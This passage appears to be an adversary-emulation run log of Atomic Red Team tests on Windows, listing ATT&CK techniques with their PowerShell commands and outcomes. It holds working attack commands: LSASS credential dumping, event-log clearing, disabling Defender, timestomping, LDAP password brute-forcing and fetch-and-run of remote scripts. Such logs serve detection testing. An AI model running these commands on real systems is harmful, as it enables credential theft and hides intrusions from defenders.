         '(Windows)',
 'pid': 5428,
 'plaintext_command': '$Manufacturer = Get-WmiObject -Class '
                      'Win32_ComputerSystem | select-object -expandproperty '
                      '"Manufacturer"; $Model = Get-WmiObject -Class '
                      'Win32_ComputerSystem | select-object -expandproperty '
                      '"Model"; if((($Manufacturer.ToLower() -eq "microsoft '
                      'corporation") -and '
                      '($Model.ToLower().contains("virtual"))) -or '
                      '($Manufacturer.ToLower().contains("vmware")) -or '
                      '($Model.ToLower() -eq "virtualbox")) {write-host '
                      '"Virtualization environment detected!"} else '
                      '{write-host "No virtualization environment detected!"}',
 'platform': 'windows',
 'run': '2023-12-01T11:22:53Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1003_001__credential-access__os_credential_dumping-_lsass_memory__35d92515122effdd73801c6ac3021da7__trial_1

atomic_ordering: ['35d92515122effdd73801c6ac3021da7']
------------------------------
{'ability_id': '35d92515122effdd73801c6ac3021da7',
 'agent_reported_time': '2023-11-11T13:10:36Z',
 'attack': {'tactic': 'credential-access',
            'technique_id': 'T1003.001',
            'technique_name': 'OS Credential Dumping: LSASS Memory'},
 'command': 'C:\\Windows\\System32\\rundll32.exe '
            'C:\\windows\\System32\\comsvcs.dll, MiniDump (Get-Process '
            'lsass).id $env:TEMP\\lsass-comsvcs.dmp full',
 'delegated': '2023-11-27T05:28:11Z',
 'description': 'The memory of lsass.exe is often dumped for offline '
                'credential theft attacks. This can be achieved with a '
                'built-in dll.\n'
                '\n'
                'Upon successful execution, you should see the following file '
                'created $env:TEMP\\lsass-comsvcs.dmp.\n',
 'executor': 'psh',
 'link_id': 'c23cd6fc-1ccd-40f5-854d-c7de48c2aeb7',
 'name': 'Dump LSASS.exe Memory using comsvcs.dll',
 'pid': 8312,
 'plaintext_command': 'C:\\Windows\\System32\\rundll32.exe '
                      'C:\\windows\\System32\\comsvcs.dll, MiniDump '
                      '(Get-Process lsass).id $env:TEMP\\lsass-comsvcs.dmp '
                      'full',
 'platform': 'windows',
 'run': '2023-11-27T05:28:21Z',
 'status': 0}
------------------------------
^ successfully executed technique
==============================
==============================
adversary_id: atomic__t1552_001__credential-access__unsecured_credentials-_credentials_in_files__aeb4fdbb3453127caaef0ad5c250d838__trial_1

atomic_ordering: ['aeb4fdbb3453127caaef0ad5c250d838']
------------------------------
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1106__execution__native_api__f6d9c3fbee5549837ea37ff933291656__trial_1

atomic_ordering: ['f6d9c3fbee5549837ea37ff933291656']
------------------------------
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1070_006__defense-evasion__indicator_removal_on_host-_timestomp__f1dcadde207fafe338ae3eb48805f23c__trial_1

atomic_ordering: ['f1dcadde207fafe338ae3eb48805f23c']
------------------------------
{'ability_id': 'f1dcadde207fafe338ae3eb48805f23c',
 'agent_reported_time': '2023-11-11T13:10:31Z',
 'attack': {'tactic': 'defense-evasion',
            'technique_id': 'T1070.006',
            'technique_name': 'Indicator Removal on Host: Timestomp'},
 'command': 'Get-ChildItem '
            '"PathToAtomicsFolder\\..\\ExternalPayloads\\T1551.006_timestomp.txt" '
            '| % { $_.LastWriteTime = "01/01/1970 00:00:00" }',
 'delegated': '2023-11-28T19:53:55Z',
 'description': 'Modifies the file last modified timestamp of a specified '
                'file. This technique was seen in use by the Stitch RAT.\n'
                'To verify execution, use File Explorer to view the Properties '
                'of the file and observe that the Modified time is the year '
                '1970.\n',
 'executor': 'psh',
 'link_id': '1df1fa89-6988-495a-96a4-8647b01ba8cc',
 'name': 'Windows - Modify file last modified timestamp with PowerShell',
 'pid': 5116,
 'plaintext_command': 'Get-ChildItem '
                      '"PathToAtomicsFolder\\..\\ExternalPayloads\\T1551.006_timestomp.txt" '
                      '| % { $_.LastWriteTime = "01/01/1970 00:00:00" }',
 'platform': 'windows',
 'run': '2023-11-28T19:54:35Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1070_006__defense-evasion__indicator_removal_on_host-_timestomp__1f2da2639fcd636ef1c7ead72de4469f__trial_1

atomic_ordering: ['1f2da2639fcd636ef1c7ead72de4469f']
------------------------------
{'ability_id': '1f2da2639fcd636ef1c7ead72de4469f',
 'agent_reported_time': '2023-11-11T13:10:35Z',
 'attack': {'tactic': 'defense-evasion',
            'technique_id': 'T1070.006',
            'technique_name': 'Indicator Removal on Host: Timestomp'},
 'command': 'Get-ChildItem '
            '"PathToAtomicsFolder\\..\\ExternalPayloads\\T1551.006_timestomp.txt" '
            '| % { $_.CreationTime = "01/01/1970 00:00:00" }',
 'delegated': '2023-11-28T19:14:51Z',
 'description': 'Modifies the file creation timestamp of a specified file. '
                'This technique was seen in use by the Stitch RAT.\n'
                'To verify execution, use File Explorer to view the Properties '
                'of the file and observe that the Created time is the year '
                '1970.\n',
 'executor': 'psh',
 'link_id': '96759bb9-40b0-4588-a161-6c07c3b4f821',
 'name': 'Windows - Modify file creation timestamp with PowerShell',
 'pid': 5520,
 'plaintext_command': 'Get-ChildItem '
                      '"PathToAtomicsFolder\\..\\ExternalPayloads\\T1551.006_timestomp.txt" '
                      '| % { $_.CreationTime = "01/01/1970 00:00:00" }',
 'platform': 'windows',
 'run': '2023-11-28T19:15:40Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1553_005__defense-evasion__subvert_trust_controls-_mark-of-the-web_bypass__7f0f5471543a6f188b0fbdc436c49fd9__trial_1

atomic_ordering: ['7f0f5471543a6f188b0fbdc436c49fd9']
------------------------------
{'ability_id': '7f0f5471543a6f188b0fbdc436c49fd9',
 'agent_reported_time': '2023-11-11T13:09:49Z',
 'attack': {'tactic': 'defense-evasion',
            'technique_id': 'T1553.005',
            'technique_name': 'Subvert Trust Controls: Mark-of-the-Web Bypass'},
 'command': 'Unblock-File -Path $env:tmp\\ReadMe.md',
 'delegated': '2023-12-02T20:18:37Z',
 'description': 'Remove the Zone.Identifier alternate data stream which '
                'identifies the file as downloaded from the internet.\n'
                'Removing this allows more freedom in executing scripts in '
                'PowerShell and avoids opening files in protected view.\n',
 'executor': 'psh',
 'link_id': '5a0aa581-4936-47f6-8e49-6c29561821bf',
 'name': 'Remove the Zone.Identifier alternate data stream',
 'pid': 5244,
 'plaintext_command': 'Unblock-File -Path $env:tmp\\ReadMe.md',
 'platform': 'windows',
 'run': '2023-12-02T20:18:51Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1070_001__defense-evasion__indicator_removal_on_host-_clear_windows_event_logs__05f8b752dbccff102ef530103bd8e550__trial_1

atomic_ordering: ['05f8b752dbccff102ef530103bd8e550']
------------------------------
{'ability_id': '05f8b752dbccff102ef530103bd8e550',
 'agent_reported_time': '2023-11-11T13:09:12Z',
 'attack': {'tactic': 'defense-evasion',
            'technique_id': 'T1070.001',
            'technique_name': 'Indicator Removal on Host: Clear Windows Event '
                              'Logs'},
 'command': '[Net.ServicePointManager]::SecurityProtocol = '
            '[Net.SecurityProtocolType]::Tls12; IEX (iwr '
            '"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1" '
            '-UseBasicParsing); Invoke-Maldoc -macroFile '
            '"PathToAtomicsFolder\\T1070.001\\src\\T1070.001-macrocode.txt" '
            '-officeProduct "Word" -sub "ClearLogs"',
 'delegated': '2023-11-28T15:40:31Z',
 'description': 'This module utilizes WMI via VBA to clear the Security and '
                'Backup eventlogs from the system. \n'
                '\n'
                'Elevation is required for this module to execute properly, '
                'otherwise WINWORD will throw an "Access Denied" error\n',
 'executor': 'psh',
 'link_id': '4e6eb0cf-a1d6-418e-840d-29875fb7f4a1',
 'name': 'Clear Event Logs via VBA',
 'pid': 3788,
 'plaintext_command': '[Net.ServicePointManager]::SecurityProtocol = '
                      '[Net.SecurityProtocolType]::Tls12; IEX (iwr '
                      '"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1" '
                      '-UseBasicParsing); Invoke-Maldoc -macroFile '
                      '"PathToAtomicsFolder\\T1070.001\\src\\T1070.001-macrocode.txt" '
                      '-officeProduct "Word" -sub "ClearLogs"',
 'platform': 'windows',
 'run': '2023-11-28T15:40:45Z',
 'status': 0}
------------------------------
^ successfully executed technique
==============================
==============================
adversary_id: atomic__t1070_001__defense-evasion__indicator_removal_on_host-_clear_windows_event_logs__6fa417fb183d6c20a67e617c0249f04f__trial_1

atomic_ordering: ['6fa417fb183d6c20a67e617c0249f04f']
------------------------------
{'ability_id': '6fa417fb183d6c20a67e617c0249f04f',
 'agent_reported_time': '2023-11-11T13:10:26Z',
 'attack': {'tactic': 'defense-evasion',
            'technique_id': 'T1070.001',
            'technique_name': 'Indicator Removal on Host: Clear Windows Event '
                              'Logs'},
 'command': '$logs = Get-EventLog -List | ForEach-Object {$_.Log}; $logs | '
            'ForEach-Object {Clear-EventLog -LogName $_ }; Get-EventLog -list',
 'delegated': '2023-11-28T16:00:06Z',
 'description': 'Clear event logs using built-in PowerShell commands.\n'
                'Upon successful execution, you should see the list of deleted '
                'event logs\n'
                'Upon execution, open the Security.evtx logs at '
                'C:\\Windows\\System32\\winevt\\Logs and verify that it is now '
                'empty or has very few logs in it.\n',
 'executor': 'psh',
 'link_id': '0b78cbc3-f5a1-4404-aae3-ca7066e10baa',
 'name': 'Delete System Logs Using Clear-EventLog',
 'pid': 7344,
 'plaintext_command': '$logs = Get-EventLog -List | ForEach-Object {$_.Log}; '
                      '$logs | ForEach-Object {Clear-EventLog -LogName $_ }; '
                      'Get-EventLog -list',
 'platform': 'windows',
 'run': '2023-11-28T16:00:41Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1218_005__defense-evasion__signed_binary_proxy_execution-_mshta__c29f0da7c0bf612d30acb64e1d6e9368__trial_1

atomic_ordering: ['c29f0da7c0bf612d30acb64e1d6e9368']
------------------------------
{'ability_id': 'c29f0da7c0bf612d30acb64e1d6e9368',
 'agent_reported_time': '2023-11-11T13:10:21Z',
 'attack': {'tactic': 'defense-evasion',
            'technique_id': 'T1218.005',
            'technique_name': 'Signed Binary Proxy Execution: Mshta'},
 'command': '$RequiredModule = Get-Module -Name AtomicTestHarnesses '
            '-ListAvailable; if (-not $RequiredModule) {Install-Module -Name '
            'AtomicTestHarnesses -Scope CurrentUser -Force};  ;  '
            'Invoke-ATHHTMLApplication -TemplatePE -AsLocalUNCPath '
            '-MSHTAFilePath $env:windir\\system32\\mshta.exe',
 'delegated': '2023-12-01T00:03:57Z',
 'description': 'Executes an HTA Application with Simulate lateral movement '
                'over UNC Path.',
 'executor': 'psh',
 'link_id': '6cf6d150-548d-4705-b16f-8888b94e8dfc',
 'name': 'Invoke HTML Application - Simulate Lateral Movement over UNC Path',
 'pid': 10636,
 'plaintext_command': '$RequiredModule = Get-Module -Name AtomicTestHarnesses '
                      '-ListAvailable; if (-not $RequiredModule) '
                      '{Install-Module -Name AtomicTestHarnesses -Scope '
                      'CurrentUser -Force};  ;  Invoke-ATHHTMLApplication '
                      '-TemplatePE -AsLocalUNCPath -MSHTAFilePath '
                      '$env:windir\\system32\\mshta.exe',
 'platform': 'windows',
 'run': '2023-12-01T00:04:55Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1562_001__defense-evasion__impair_defenses-_disable_or_modify_tools__43e3334362b140924f001b256b229ee5__trial_1

atomic_ordering: ['43e3334362b140924f001b256b229ee5']
------------------------------
{'ability_id': '43e3334362b140924f001b256b229ee5',
 'agent_reported_time': '2023-11-11T13:09:55Z',
 'attack': {'tactic': 'defense-evasion',
            'technique_id': 'T1562.001',
            'technique_name': 'Impair Defenses: Disable or Modify Tools'},
 'command': 'Set-ItemProperty "HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows '
            'Defender" -Name DisableAntiSpyware -Value 1',
 'delegated': '2023-12-03T10:30:52Z',
 'description': 'Disable Windows Defender from starting after a reboot. Upen '
                'execution, if the computer is rebooted the entire Virus and '
                'Threat protection window in Settings will be\n'
                'grayed out and have no info.\n',
 'executor': 'psh',
 'link_id': '8879214d-6afb-4931-9be3-ed619a28d3d1',
 'name': 'Tamper with Windows Defender Registry',
 'pid': 1576,
 'plaintext_command': 'Set-ItemProperty '
                      '"HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows '
                      'Defender" -Name DisableAntiSpyware -Value 1',
 'platform': 'windows',
 'run': '2023-12-03T10:30:55Z',
 'status': 0}
------------------------------
^ successfully executed technique
==============================
==============================
adversary_id: atomic__t1564__defense-evasion__hide_artifacts__83a5ad479c9e313e60f34380e193102a__trial_1

atomic_ordering: ['83a5ad479c9e313e60f34380e193102a']
------------------------------
{'ability_id': '83a5ad479c9e313e60f34380e193102a',
 'agent_reported_time': '2023-11-11T13:10:05Z',
 'attack': {'tactic': 'defense-evasion',
            'technique_id': 'T1564',
            'technique_name': 'Hide Artifacts'},
 'command': 'New-LocalUser -Name "Administrator " -NoPassword',
 'delegated': '2023-12-03T20:32:21Z',
 'description': 'Creating a user with a username containing with a space on '
                'the end',
 'executor': 'psh',
 'link_id': '360c5815-887c-42c5-ac1f-e1a7da1ff4df',
 'name': 'Create an "Administrator " user (with a space on the end)',
 'pid': 1444,
 'plaintext_command': 'New-LocalUser -Name "Administrator " -NoPassword',
 'platform': 'windows',
 'run': '2023-12-03T20:32:34Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1134_002__multiple__create_process_with_token__163fd8a878476002c604d0fe4e32a419__trial_1

atomic_ordering: ['163fd8a878476002c604d0fe4e32a419']
------------------------------
{'ability_id': '163fd8a878476002c604d0fe4e32a419',
 'agent_reported_time': '2023-11-11T13:09:46Z',
 'attack': {'tactic': 'multiple',
            'technique_id': 'T1134.002',
            'technique_name': 'Create Process with Token'},
 'command': 'Set-ExecutionPolicy -Scope Process Bypass -Force; $owners = @{}; '
            'gwmi win32_process |% {$owners[$_.handle] = $_.getowner().user}; '
            'Get-Process | Select '
            'ProcessName,Id,@{l="Owner";e={$owners[$_.id.tostring()]}}; & '
            '"$PathToAtomicsFolder\\T1134.002\\src\\GetToken.ps1"; '
            '[MyProcess]::CreateProcessFromParent((Get-Process '
            'lsass).Id,"cmd.exe")',
 'delegated': '2023-11-30T07:16:57Z',
 'description': 'This Action demonstrates how an access token for a specific '
                'program can spawn another program under a different owner. \n'
                'Adversaries can leverage access tokens to run programs under '
                'a different user not only to achieve privilege escalation but '
                'also to evade detection by blending in with normal user '
                'activity. \n'
                'This Action will query all processes and list the process '
                'name and owner.It will then make a copy of an existing token '
                'to create a new instance of cmd.exe\n',
 'executor': 'psh',
 'link_id': '84c1a872-ab3b-4ca9-aad8-7f867cc50651',
 'name': 'Access Token Manipulation',
 'pid': 8424,
 'plaintext_command': 'Set-ExecutionPolicy -Scope Process Bypass -Force; '
                      '$owners = @{}; gwmi win32_process |% '
                      '{$owners[$_.handle] = $_.getowner().user}; Get-Process '
                      '| Select '
                      'ProcessName,Id,@{l="Owner";e={$owners[$_.id.tostring()]}}; '
                      '& "$PathToAtomicsFolder\\T1134.002\\src\\GetToken.ps1"; '
                      '[MyProcess]::CreateProcessFromParent((Get-Process '
                      'lsass).Id,"cmd.exe")',
 'platform': 'windows',
 'run': '2023-11-30T07:17:26Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1552_004__credential-access__unsecured_credentials-_private_keys__995eb25ee0b9d036110318311ca2527b__trial_1

atomic_ordering: ['995eb25ee0b9d036110318311ca2527b']
------------------------------
{'ability_id': '995eb25ee0b9d036110318311ca2527b',
 'agent_reported_time': '2023-11-11T13:10:02Z',
 'attack': {'tactic': 'credential-access',
            'technique_id': 'T1552.004',
            'technique_name': 'Unsecured Credentials: Private Keys'},
 'command': '$cert = New-SelfSignedCertificate -DnsName atomicredteam.com '
            '-CertStoreLocation cert:\\LocalMachine\\My; Set-Location '
            'Cert:\\LocalMachine\\My; Export-Certificate -Type CERT -Cert  '
            'Cert:\\LocalMachine\\My\\$($cert.Thumbprint) -FilePath '
            '$env:Temp\\AtomicRedTeam.cer',
 'delegated': '2023-12-02T17:23:01Z',
 'description': 'Creates a Root certificate and exports it with '
                'Export-Certificate PowerShell Cmdlet.\n'
                'Upon a successful attempt, this will write a pfx to disk and '
                'utilize the Cmdlet Export-Certificate.\n',
 'executor': 'psh',
 'link_id': 'ce9294ac-9898-4981-8f07-da4534c72080',
 'name': 'Export Root Certificate with Export-Certificate',
 'pid': 6188,
 'plaintext_command': '$cert = New-SelfSignedCertificate -DnsName '
                      'atomicredteam.com -CertStoreLocation '
                      'cert:\\LocalMachine\\My; Set-Location '
                      'Cert:\\LocalMachine\\My; Export-Certificate -Type CERT '
                      '-Cert  Cert:\\LocalMachine\\My\\$($cert.Thumbprint) '
                      '-FilePath $env:Temp\\AtomicRedTeam.cer',
 'platform': 'windows',
 'run': '2023-12-02T17:23:16Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1059_001__execution__command_and_scripting_interpreter-_powershell__a9df2530a06e1aa7d1ba9e9309364b9f__trial_1

atomic_ordering: ['a9df2530a06e1aa7d1ba9e9309364b9f']
------------------------------
{'ability_id': 'a9df2530a06e1aa7d1ba9e9309364b9f',
 'agent_reported_time': '2023-11-11T13:09:55Z',
 'attack': {'tactic': 'execution',
            'technique_id': 'T1059.001',
            'technique_name': 'Command and Scripting Interpreter: PowerShell'},
 'command': '$malcmdlets = "Add-Persistence", "Find-AVSignature", '
            '"Get-GPPAutologon", "Get-GPPPassword", "Get-HttpStatus", '
            '"Get-Keystrokes", "Get-SecurityPackages", "Get-TimedScreenshot", '
            '"Get-VaultCredential", "Get-VolumeShadowCopy", "Install-SSP", '
            '"Invoke-CredentialInjection", "Invoke-DllInjection", '
            '"Invoke-Mimikatz", "Invoke-NinjaCopy", "Invoke-Portscan", '
            '"Invoke-ReflectivePEInjection", "Invoke-ReverseDnsLookup", '
            '"Invoke-Shellcode", "Invoke-TokenManipulation", '
            '"Invoke-WmiCommand", "Mount-VolumeShadowCopy", '
            '"New-ElevatedPersistenceOption", "New-UserPersistenceOption", '
            '"New-VolumeShadowCopy", "Out-CompressedDll", '
            '"Out-EncodedCommand", "Out-EncryptedScript", "Out-Minidump", '
            '"PowerUp", "PowerView", "Remove-Comments", '
            '"Remove-VolumeShadowCopy", "Set-CriticalProcess", '
            '"Set-MasterBootRecord"; foreach ($cmdlets in $malcmdlets) {;     '
            '"function $cmdlets { Write-Host Pretending to invoke $cmdlets '
            '}"}; foreach ($cmdlets in $malcmdlets) {;     $cmdlets}',
 'delegated': '2023-11-28T07:19:45Z',
 'description': 'Powershell execution of known Malicious PowerShell Cmdlets',
 'executor': 'psh',
 'link_id': '8a579480-58d5-4bf5-8285-2599fb443ed3',
 'name': 'PowerShell Invoke Known Malicious Cmdlets',
 'pid': 764,
 'plaintext_command': '$malcmdlets = "Add-Persistence", "Find-AVSignature", '
                      '"Get-GPPAutologon", "Get-GPPPassword", '
                      '"Get-HttpStatus", "Get-Keystrokes", '
                      '"Get-SecurityPackages", "Get-TimedScreenshot", '
                      '"Get-VaultCredential", "Get-VolumeShadowCopy", '
                      '"Install-SSP", "Invoke-CredentialInjection", '
                      '"Invoke-DllInjection", "Invoke-Mimikatz", '
                      '"Invoke-NinjaCopy", "Invoke-Portscan", '
                      '"Invoke-ReflectivePEInjection", '
                      '"Invoke-ReverseDnsLookup", "Invoke-Shellcode", '
                      '"Invoke-TokenManipulation", "Invoke-WmiCommand", '
                      '"Mount-VolumeShadowCopy", '
                      '"New-ElevatedPersistenceOption", '
                      '"New-UserPersistenceOption", "New-VolumeShadowCopy", '
                      '"Out-CompressedDll", "Out-EncodedCommand", '
                      '"Out-EncryptedScript", "Out-Minidump", "PowerUp", '
                      '"PowerView", "Remove-Comments", '
                      '"Remove-VolumeShadowCopy", "Set-CriticalProcess", '
                      '"Set-MasterBootRecord"; foreach ($cmdlets in '
                      '$malcmdlets) {;     "function $cmdlets { Write-Host '
                      'Pretending to invoke $cmdlets }"}; foreach ($cmdlets in '
                      '$malcmdlets) {;     $cmdlets}',
 'platform': 'windows',
 'run': '2023-11-28T07:20:03Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1218_004__defense-evasion__signed_binary_proxy_execution-_installutil__c0bc49e3838d26569b243ae283082926__trial_1

atomic_ordering: ['c0bc49e3838d26569b243ae283082926']
------------------------------
{'ability_id': 'c0bc49e3838d26569b243ae283082926',
 'agent_reported_time': '2023-11-11T13:09:32Z',
 'attack': {'tactic': 'defense-evasion',
            'technique_id': 'T1218.004',
            'technique_name': 'Signed Binary Proxy Execution: InstallUtil'},
 'command': 'if (Test-Path "eaecbe_InstallUtilTestHarness.ps1") { ; } else '
            '{New-Item -Type Directory (split-path '
            '"eaecbe_InstallUtilTestHarness.ps1") -ErrorAction ignore | '
            'Out-Null; Invoke-WebRequest '
            "'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.004/src/InstallUtilTestHarness.ps1' "
            '-OutFile "eaecbe_InstallUtilTestHarness.ps1"};  ; . '
            '"eaecbe_InstallUtilTestHarness.ps1"; $InstallerAssemblyDir = '
            '"$Env:TEMP\\"; $InstallerAssemblyFileName = "T1218.004.dll"; '
            '$InstallerAssemblyFullPath = Join-Path -Path '
            '$InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName; '
            '$CommandLine = "/logfile= /logtoconsole=false '
            '/installtype=notransaction /action=uninstall '
            '`"$InstallerAssemblyFullPath`""; $ExpectedOutput = '
            "'Constructor_Uninstall_'; $TestArgs = @{;     "
            'OutputAssemblyDirectory = $InstallerAssemblyDir;     '
            'OutputAssemblyFileName = $InstallerAssemblyFileName;     '
            "InvocationMethod = 'Executable';     CommandLine = $CommandLine; "
            '}; $ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly '
            '@TestArgs; if ($ActualOutput -ne $ExpectedOutput) {;     throw '
            '@"; InstallUtil Uninstall method execution test failure. '
            'Installer assembly execution output did not match the expected '
            'output.; Expected: $ExpectedOutput; Actual: $ActualOutput; "@; }',
 'delegated': '2023-11-30T22:07:43Z',
 'description': 'Executes the Uninstall Method. Upon execution, version '
                'information will be displayed the .NET framework install '
                'utility.\n',
 'executor': 'psh',
 'link_id': '7568ee97-f251-4fe7-a06b-058bafddc146',
 'name': "InstallUtil Uninstall method call - '/installtype=notransaction "
         "/action=uninstall' variant",
 'pid': 3788,
 'plaintext_command': 'if (Test-Path "eaecbe_InstallUtilTestHarness.ps1") { ; '
                      '} else {New-Item -Type Directory (split-path '
                      '"eaecbe_InstallUtilTestHarness.ps1") -ErrorAction '
                      'ignore | Out-Null; Invoke-WebRequest '
                      "'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.004/src/InstallUtilTestHarness.ps1' "
                      '-OutFile "eaecbe_InstallUtilTestHarness.ps1"};  ; . '
                      '"eaecbe_InstallUtilTestHarness.ps1"; '
                      '$InstallerAssemblyDir = "$Env:TEMP\\"; '
                      '$InstallerAssemblyFileName = "T1218.004.dll"; '
                      '$InstallerAssemblyFullPath = Join-Path -Path '
                      '$InstallerAssemblyDir -ChildPath '
                      '$InstallerAssemblyFileName; $CommandLine = "/logfile= '
                      '/logtoconsole=false /installtype=notransaction '
                      '/action=uninstall `"$InstallerAssemblyFullPath`""; '
                      "$ExpectedOutput = 'Constructor_Uninstall_'; $TestArgs = "
                      '@{;     OutputAssemblyDirectory = '
                      '$InstallerAssemblyDir;     OutputAssemblyFileName = '
                      '$InstallerAssemblyFileName;     InvocationMethod = '
                      "'Executable';     CommandLine = $CommandLine; }; "
                      '$ActualOutput = '
                      'Invoke-BuildAndInvokeInstallUtilAssembly @TestArgs; if '
                      '($ActualOutput -ne $ExpectedOutput) {;     throw @"; '
                      'InstallUtil Uninstall method execution test failure. '
                      'Installer assembly execution output did not match the '
                      'expected output.; Expected: $ExpectedOutput; Actual: '
                      '$ActualOutput; "@; }',
 'platform': 'windows',
 'run': '2023-11-30T22:08:30Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1105__command-and-control__ingress_tool_transfer__04d33ddae0126966ae6d841267c17329__trial_1

atomic_ordering: ['04d33ddae0126966ae6d841267c17329']
------------------------------
{'ability_id': '04d33ddae0126966ae6d841267c17329',
 'agent_reported_time': '2023-11-11T13:09:18Z',
 'attack': {'tactic': 'command-and-control',
            'technique_id': 'T1105',
            'technique_name': 'Ingress Tool Transfer'},
 'command': '$imewdbled = $env:SystemRoot + '
            '"\\System32\\IME\\SHARED\\IMEWDBLD.exe"; & $imewdbled '
            'https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1105/T1105.yaml',
 'delegated': '2023-11-29T17:07:22Z',
 'description': 'Use IMEWDBLD.exe (built-in to windows) to download a file. '
                'This will throw an error for an invalid dictionary file.\n'
                'Downloaded files can be found in '
                '"%LocalAppData%\\Microsoft\\Windows\\INetCache\\<8_RANDOM_ALNUM_CHARS>/<FILENAME>[1].<EXTENSION>" '
                'or '
                '`%LocalAppData%\\Microsoft\\Windows\\INetCache\\IE\\<8_RANDOM_ALNUM_CHARS>/<FILENAME>[1].<EXTENSION>.\n'
                'Run "Get-ChildItem -Path '
                'C:\\Users\\<USERNAME>\\AppData\\Local\\Microsoft\\Windows\\INetCache\\ '
                '-Include <FILENAME>* -Recurse -Force -File -ErrorAction '
                'SilentlyContinue" without quotes and adding the correct '
                'username and file name to locate the file.\n',
 'executor': 'psh',
 'link_id': 'aa8c28e6-9305-475d-a53a-2a3a204c70ac',
 'name': 'Download a file with IMEWDBLD.exe',
 'pid': 11088,
 'plaintext_command': '$imewdbled = $env:SystemRoot + '
                      '"\\System32\\IME\\SHARED\\IMEWDBLD.exe"; & $imewdbled '
                      'https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1105/T1105.yaml',
 'platform': 'windows',
 'run': '2023-11-29T17:08:29Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1110_001__credential-access__brute_force-_password_guessing__4f277a5607b655a2e5bc05ff21ed81cf__trial_1

atomic_ordering: ['4f277a5607b655a2e5bc05ff21ed81cf']
------------------------------
{'ability_id': '4f277a5607b655a2e5bc05ff21ed81cf',
 'agent_reported_time': '2023-11-11T13:10:14Z',
 'attack': {'tactic': 'credential-access',
            'technique_id': 'T1110.001',
            'technique_name': 'Brute Force: Password Guessing'},
 'command': 'if ("NTLM".ToLower() -NotIn @("ntlm","kerberos")) {;   Write-Host '
            '"Only \'NTLM\' and \'Kerberos\' auth methods are supported";   '
            'exit 1; }; '
            '[System.Reflection.Assembly]::LoadWithPartialName("System.DirectoryServices.Protocols") '
            '| Out-Null; $di = new-object '
            'System.DirectoryServices.Protocols.LdapDirectoryIdentifier("$env:UserDnsDomain",389); '
            '$passwordList = Get-Content -Path "5cb955_passwords.txt"; foreach '
            '($password in $passwordList){;   $credz = new-object '
            'System.Net.NetworkCredential("$ENV:USERNAME", $password, '
            '"$env:UserDnsDomain");   $conn = new-object '
            'System.DirectoryServices.Protocols.LdapConnection($di, $credz, '
            '[System.DirectoryServices.Protocols.AuthType]::NTLM);   try '
            '{;     Write-Host " [-] Attempting ${password} on account '
            '$ENV:USERNAME.";     $conn.bind();     Write-Host " [!] '
            '$ENV:USERNAME:${password} are valid credentials!";   } catch '
            '{;     Write-Host $_.Exception.Message;   }; }; Write-Host "End '
            'of bruteforce"',
 'delegated': '2023-11-29T20:01:39Z',
 'description': 'Attempt to brute force Active Directory domain user on a '
                'domain controller, via LDAP, with NTLM or Kerberos\n',
 'executor': 'psh',
 'link_id': '89ed4a75-98b9-4d50-8d52-9065809ee8c3',
 'name': 'Brute Force Credentials of single Active Directory domain user via '
         'LDAP against domain controller (NTLM or Kerberos)',
 'pid': 3952,
 'plaintext_command': 'if ("NTLM".ToLower() -NotIn @("ntlm","kerberos")) {;   '
                      'Write-Host "Only \'NTLM\' and \'Kerberos\' auth methods '
                      'are supported";   exit 1; }; '
                      '[System.Reflection.Assembly]::LoadWithPartialName("System.DirectoryServices.Protocols") '
                      '| Out-Null; $di = new-object '
                      'System.DirectoryServices.Protocols.LdapDirectoryIdentifier("$env:UserDnsDomain",389); '
                      '$passwordList = Get-Content -Path '
                      '"5cb955_passwords.txt"; foreach ($password in '
                      '$passwordList){;   $credz = new-object '
                      'System.Net.NetworkCredential("$ENV:USERNAME", '
                      '$password, "$env:UserDnsDomain");   $conn = new-object '
                      'System.DirectoryServices.Protocols.LdapConnection($di, '
                      '$credz, '
                      '[System.DirectoryServices.Protocols.AuthType]::NTLM);   '
                      'try {;     Write-Host " [-] Attempting ${password} on '
                      'account $ENV:USERNAME.";     $conn.bind();     '
                      'Write-Host " [!] $ENV:USERNAME:${password} are valid '
                      'credentials!";   } catch {;     Write-Host '
                      '$_.Exception.Message;   }; }; Write-Host "End of '
                      'bruteforce"',
 'platform': 'windows',
 'run': '2023-11-29T20:02:17Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1571__command-and-control__non-standard_port__7f734143338de2b02093a703f919e7fc__trial_1

atomic_ordering: ['7f734143338de2b02093a703f919e7fc']
------------------------------
{'ability_id': '7f734143338de2b02093a703f919e7fc',
 'agent_reported_time': '2023-11-11T13:09:40Z',
 'attack': {'tactic': 'command-and-control',
            'technique_id': 'T1571',
            'technique_name': 'Non-Standard Port'},
 'command': 'Test-NetConnection -ComputerName google.com -port 8081',
